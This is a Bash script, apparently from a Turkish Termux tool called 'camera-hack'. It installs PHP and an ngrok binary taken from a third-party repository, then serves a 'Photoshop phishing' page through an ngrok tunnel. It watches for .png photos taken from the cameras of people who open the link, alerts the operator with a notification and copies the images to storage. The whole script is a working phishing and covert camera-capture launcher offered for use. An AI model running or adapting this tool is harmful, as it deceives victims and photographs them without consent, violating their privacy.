#!/bin/bash
if [[ $1 == güncelle ]];then
	cd files
	bash güncelleme.sh güncelle
	exit
fi
kontrol=$(ls /sdcard |wc -m)
if [[ $kontrol == 0 ]];then
	termux-setup-storage
	kontrol=$(ls /sdcard |wc -m)
	if [[ $kontrol == 0 ]];then
		bash camera-hack.sh
		exit
	fi
fi
#################### TERMUX-APİ ####################
kontrol=$(which termux-notification |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mTERMUX-APİ PAKETİ YÜKLENİYOR "
	echo
	echo
	echo
	pkg install termux-api -y
fi
kontrol=$(timeout 5 termux-battery-status |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m TERMUX APİ UYGULAMASINI YÜKLEYİNİZ"
	echo
	echo
	echo
	sleep 2
	am start -a android.intent.action.VIEW "https://play.google.com/store/apps/details?id=com.termux.api"
	echo
	echo
	echo
	exit
fi
#################### CURL ####################
kontrol=$(which curl |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[97m CURL PAKETİ KURLUYOR"
	echo
	echo
	echo
	pkg install curl -y
fi
#################### PHP ####################
kontrol=$(which php |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[*] \e[0mPHP PAKETİ YÜKLENİYOR "
	echo
	echo
	echo
	pkg install php -y
fi

#################### NGROK ####################
kontrol=$(which ngrok |wc -l)
if [[ $kontrol == 0 ]];then
	echo
	echo
	echo
	printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
	echo
	echo
	echo
	git clone https://github.com/termuxxtoolss/ngrok
	mv ngrok/ngrok /data/data/com.termux/files/usr/bin
	chmod 777 /data/data/com.termux/files/usr/bin/ngrok
	rm -rf ngrok
else
	kontrol=$(ngrok version |awk -F 'version ' {'print $2'})
	if [[ $kontrol != 2.2.6 ]];then
		rm $PREFIX/bin/ngrok
		echo
		echo
		echo
		printf "\e[33m[*] \e[0mNGROK YÜKLENİYOR "
		echo
		echo
		echo
		git clone https://github.com/termuxxtoolss/ngrok
		mv ngrok/ngrok /data/data/com.termux/files/usr/bin
		chmod 777 /data/data/com.termux/files/usr/bin/ngrok
		rm -rf ngrok
	fi
fi

cd files
bash güncelleme.sh
bash banner.sh
function finish() {
	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -o ngrok)
	if [[ $kontrol == ngrok ]];then
		killall ngrok
		killall php
	fi
	exit
}
stty susp ""
stty eof ""
trap finish SIGINT
dongu() {
kontrol=$(ls |grep .png |wc -l)
while :
do
	kontrol=$(ls |grep .png |wc -l)
	if [[ $kontrol -gt 0 ]];then
		clear
		termux-notification -t CAMERA-HACK -c "[✓] RESİM ALINDI"
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
		echo
		echo
		echo
		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
		echo
		echo
		echo
		exit
	fi
done
}
dongu2() {
ls |grep .png |wc -l > .sayi.txt
while :
do
	kontrol1=$(cat .sayi.txt)
	kontrol2=$(ls |grep .png |wc -l)
	if [[ $kontrol1 != $kontrol2 ]];then
		echo -e "$(ls |grep .png |wc -l)" > .sayi.txt
		clear
		termux-notification -t CAMERA-HACK -c "[✓] RESİM ALINDI"
		echo
		echo
		echo
		printf "\e[32m[✓]\e[33m $kontrol2\e[97m ADET RESİM BULUNDU"
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
		echo
		echo
		echo
		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
		echo
		echo
		echo
		exit
	fi
done
exit
}
bulunan() {
kontrol=$(ls |grep .png |wc -l)
if [[ $kontrol -gt 0 ]];then
	echo
	echo
	echo
	printf "\e[32m[✓]\e[33m $kontrol\e[97m ADET RESİM BULUNDU"
	echo
	echo
	echo
	read -e -p $'\e[97mKAYDEDİLEN ESKİ RESİMLER SİLİNSİN Mİ ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' sec
	if [[ $sec == e || $sec == E ]];then
		while :
		do
			sayi=$(ls |grep .png |wc -l)
			if [[ $sayi == 0 ]];then
				break
			fi
			for no in `seq 1 $sayi`;do
				resim=$(ls |grep .png |sed -n $no\p)
				if [[ $resim == "" ]];then
					break
				fi
				rm $resim
			done
		done
		echo
		echo
		echo
		printf "\e[32m[✓]\e[97m SİLME İŞLEMİ TAMAMLANDI"
		echo
		echo
		echo
		read -e -p $'\e[97mDEVAM ETMEK İSTİYOR MUSUN ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' secim
		if [[ $secim == e || $secim == E ]];then
			sleep 1
		elif [[ $secim == h || $secim == H ]];then
			echo
			echo
			echo
			printf "\e[33m[*]\e[97m İŞLEM İPTAL EDİLDİ"
			echo
			echo
			echo
			sleep 2
			cd ../..
			bash camera-hack.sh
			exit
		else
			echo
			echo
			echo
			printf "\e[31m[!]\e[97m HATALI SEÇİM"
			echo
			echo
			echo
			sleep 2
			cd ../..
			bash camera-hack.sh
			exit

		fi
	elif [[ $sec == h || $sec == H ]];then
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m SİLME İŞLEMİ İPTAL EDİLDİ"
		echo
		echo
		echo
		echo
		sleep 1
		kontrol=$(basename $(pwd))
		if [[ $kontrol == photoshop ]];then
			port="4141"
		fi
		bash index.sh -bg -p $port
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
		echo
		echo
		echo
		printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
		echo
		echo
		echo
		dongu2

	else
		echo
		echo
		echo
		printf "\e[31m[!]\e[97m HATALI SEÇİM"
		echo
		echo
		echo
		sleep 2
		cd ../..
		bash camera-hack.sh
		exit
	fi
fi
}
image() {
	if [[ -a /sdcard/CAMERA-HACK-İMAGE ]];then
		echo
	else
		mkdir /sdcard/CAMERA-HACK-İMAGE
	fi
	sayi=$(ls |grep .png |wc -l)
	if [[ $sayi == 0 ]];then
		echo
		echo
		echo
		printf "\e[33m[*]\e[97m KAYITLI RESİM BULUNAMADI"
		echo
		echo
		echo
		cd ../..
		sleep 2
		bash camera-hack.sh
		exit
	fi
	for no in `seq 1 $sayi`;do
		resim=$(ls |grep .png |sed -n $no\p)
		cp $resim /sdcard/CAMERA-HACK-İMAGE
		if [[ "$no" = "$sayi" ]];then
			break
		fi
	done
}

printf "

\e[0m

\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mPHOTOSHOP PHİSHİNG\e[97m

\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[33mRESİMLERİ DOSYALARA KOPYALA\e[97m

\e[31m[\e[97mK\e[31m]\e[97m ────────── \e[33mPHP & NGROK BAĞLANTIYI KES\e[97m

\e[31m[\e[97mX\e[31m]\e[97m ────────── \e[31mÇIKIŞ\e[97m
"
echo
echo
echo
read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]───────►  \e[0m' secim
if [[ $secim == 1 ]];then
	cd photoshop
	bulunan
	bash index.sh -bg -p 4141
	echo
	echo
	echo
	printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
	echo
	echo
	echo
	printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
	echo
	echo
	echo
	dongu
elif [[ $secim == 2 ]];then
	cd photoshop
	image
	printf "\e[32m
        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[97m
	
	TÜM RESİMLER DOSYALAR İÇİNDE \e[33m[ \e[97mDAHİLİ HAFIZA\e[33m ]\e[33m

	CAMERA-HACK-İMAGE\e[97m KLASÖRÜNE KAYDEDİLDİ
	\e[32m
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\e[97m"
	sleep 5
	cd ../..
	bash camera-hack.sh
elif [[ $secim == k || $secim == K ]];then
	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
	if [[ $kontrol == 1 ]];then
		killall php
		killall ngrok
		echo
		echo
		echo
		printf "\e[32m[✓] \e[33mPHP & NGROK\e[97m ARKAPLANDAN KAPATILDI"
		echo
		echo
		echo
		sleep 2
		cd ..
		bash camera-hack.sh
	else
		echo
		echo
		echo
		printf "\e[31m[*] \e[33mPHP & NGROK\e[97m ARKAPLANDA ÇALIŞMIYOR"
		echo
		echo
		echo
		sleep 2
		cd ..
		bash camera-hack.sh
		exit
	fi
elif [[ $secim == x || $secim == X ]];then
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m ÇIKIŞ YAPILDI\e[31m !!!\e[0m"
	echo
	echo
	echo
	exit
else
	echo
	echo
	echo
	printf "\e[31m[!]\e[97m HATALI SEÇİM\e[0m"
	echo
	echo
	echo
	sleep 2
	cd ..
	bash camera-hack.sh
fi
